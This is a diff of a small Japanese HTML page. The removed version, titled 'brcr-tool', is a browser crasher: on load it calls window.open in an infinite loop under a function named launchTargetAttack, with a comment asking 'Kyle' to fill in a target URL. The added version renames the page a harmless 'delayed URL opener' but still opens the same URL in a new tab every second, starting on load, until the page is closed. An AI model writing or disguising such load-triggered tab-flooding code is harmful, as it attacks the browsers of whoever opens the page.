@@ -1,27 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>brcr-tool</title>
+    <title>遅延付きURLオープナー</title>
 </head>
 <body>
 
-    <h1>残念。</h1>
-    <p>じゃあね</p>
+    <h1>URLを1秒ごとに開いています...</h1>
+    <p>このページを閉じるまで、指定されたURLが1秒間隔で開かれます。</p>
 
     <script>
-        // *** ここにターゲットURLを記入しろ、カイル！ ***
-        const targetURL = "https://very-noob-jp.github.io/dont-touth/っｓっっっｄ.html"; 
+        // 開きたいURLを指定します（例：ご自身のサイトのURL）
+        const targetURL = "https://very-noob-jp.github.io/dont-touth/っｓっっっｄ.html";
+        const delayInMilliseconds = 1000; // 1秒 = 1000ミリ秒
 
-        function launchTargetAttack() {
-            // 無限ループを開始
-            while (true) {
-                // targetURLを新しいウィンドウ/タブで開く。
-                window.open(targetURL);
-            }
+        function openURLWithDelay() {
+            // 新しいウィンドウ/タブでURLを開きます
+            window.open(targetURL);
         }
 
-        // ページ読み込み完了後、増殖を開始。
-        setTimeout(launchTargetAttack, 500); 
+        // 1000ミリ秒（1秒）ごとに openURLWithDelay 関数を繰り返し実行します
+        const intervalId = setInterval(openURLWithDelay, delayInMilliseconds);
+
+        // 注意: 停止したい場合は、ブラウザのタブを閉じるか、
+        // 以下のコードをどこかに実行して intervalId をクリアする必要があります。
+        // 例: clearInterval(intervalId);
     </script>
 
 </body>
